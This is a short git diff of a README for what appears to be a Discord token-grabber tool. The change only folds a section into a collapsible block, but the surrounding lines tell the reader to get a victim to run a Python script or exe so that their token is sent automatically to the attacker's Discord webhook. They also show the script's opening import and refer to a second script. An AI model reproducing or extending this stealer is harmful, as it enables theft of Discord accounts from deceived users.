@@ -84,7 +84,9 @@ request.send(JSON.stringify(params));
 
 Get user to run python code OR exe file and token will be automatically sent back to you via discord webhook. 
 
-First Python Script (Requires pip installation of some libraries), replace ```WEBHOOK HERE``` with your webhook URL : 
+<details>
+
+<summary>First Python Script (Requires pip installation of some libraries), replace ```WEBHOOK HERE``` with your webhook URL : </summary>
 
 ```
 from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -286,6 +288,7 @@ def Auth():
     
 Auth()
 ```
+</details>
 
 Second Python Script, replace ```WEBHOOK HERE``` with your webhook URL : 
 
